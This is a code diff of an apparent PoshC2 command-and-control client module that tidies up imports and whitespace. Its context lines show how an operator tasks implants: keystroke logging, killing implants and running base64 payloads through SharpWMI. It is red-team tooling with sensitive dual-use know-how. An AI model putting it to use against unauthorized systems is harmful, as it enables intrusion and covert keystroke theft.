@@ -1,25 +1,20 @@
 import base64, re, traceback, os, string, sys
-from poshc2.client.Alias import cs_alias, cs_replace
-from poshc2.Colours import Colours
-from poshc2.Utils import validate_sleep_time, argp, load_file, gen_key
-from poshc2.server.AutoLoads import check_module_loaded, run_autoloads_sharp
-from poshc2.client.Help import sharp_help1
-from poshc2.server.Config import PoshInstallDirectory, PoshProjectDirectory, SocksHost, PayloadsDirectory, DatabaseType
-from poshc2.server.Core import print_bad
-from poshc2.client.cli.CommandPromptCompleter import FilePathCompleter
-from poshc2.server.PowerStatus import getpowerstatus
 from prompt_toolkit import PromptSession
 from prompt_toolkit.history import FileHistory
 from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
 from prompt_toolkit.styles import Style
 
-
-if DatabaseType.lower() == "postgres":
-    from poshc2.server.database.DBPostgres import new_task, unhide_implant, kill_implant, get_implantdetails, get_sharpurls
-    from poshc2.server.database.DBPostgres import select_item, new_c2_message, get_powerstatusbyrandomuri, update_label, get_randomuri
-else:
-    from poshc2.server.database.DBSQLite import new_task, unhide_implant, kill_implant, get_implantdetails, get_sharpurls
-    from poshc2.server.database.DBSQLite import select_item, new_c2_message, get_powerstatusbyrandomuri, update_label, get_randomuri
+from poshc2.client.Alias import cs_alias, cs_replace
+from poshc2.Colours import Colours
+from poshc2.Utils import validate_sleep_time, argp, load_file, gen_key
+from poshc2.server.AutoLoads import check_module_loaded, run_autoloads_sharp
+from poshc2.client.Help import sharp_help1
+from poshc2.server.Config import PoshInstallDirectory, PoshProjectDirectory, SocksHost, PayloadsDirectory
+from poshc2.server.Core import print_bad
+from poshc2.client.cli.CommandPromptCompleter import FilePathCompleter
+from poshc2.server.PowerStatus import getpowerstatus
+from poshc2.server.database.DB import new_task, unhide_implant, kill_implant, get_implantdetails, get_sharpurls
+from poshc2.server.database.DB import select_item, new_c2_message, get_powerstatusbyrandomuri, update_label, get_randomuri
 
 
 def handle_pbind_command(command, user, randomuri, implant_id):
@@ -150,7 +145,7 @@ def handle_pbind_command(command, user, randomuri, implant_id):
 
     elif (command.startswith("stop-keystrokes")):
         new_task("pbind-command run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
-        update_label("", randomuri)     
+        update_label("", randomuri)
 
     elif (command.startswith("start-keystrokes")):
         check_module_loaded("Logger.exe", randomuri, user)
@@ -187,14 +182,14 @@ def handle_pbind_command(command, user, randomuri, implant_id):
 
     elif (command.startswith("stop-powerstatus")):
         new_task(f"pbind-command {command}", user, randomuri)
-        update_label("", randomuri)  
+        update_label("", randomuri)
 
     elif (command.startswith("stoppowerstatus")):
         new_task(f"pbind-command {command}", user, randomuri)
         update_label("", randomuri)
 
     elif (command.startswith("pslo")):
-        new_task(f"pbind-{command}", user, randomuri) 
+        new_task(f"pbind-{command}", user, randomuri)
 
     elif (command.startswith("run-exe SharpWMI.Program")) and "execute" in command and "payload" not in command:
         style = Style.from_dict({'': '#80d130'})
@@ -203,7 +198,7 @@ def handle_pbind_command(command, user, randomuri, implant_id):
             path = session.prompt("Location of base64 vbs/js file: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.b64"))
             path = PayloadsDirectory + path
         except KeyboardInterrupt:
-            return      
+            return
         if os.path.isfile(path):
             with open(path, "r") as p:
                 payload = p.read()
@@ -221,7 +216,7 @@ def handle_pbind_command(command, user, randomuri, implant_id):
     elif command.startswith("loadmoduleforce"):
         params = re.compile("loadmoduleforce ", re.IGNORECASE)
         params = params.sub("", command)
-        new_task("pbind-loadmodule %s" % params, user, randomuri)        
+        new_task("pbind-loadmodule %s" % params, user, randomuri)
 
     elif command.startswith("loadmodule"):
         params = re.compile("loadmodule ", re.IGNORECASE)
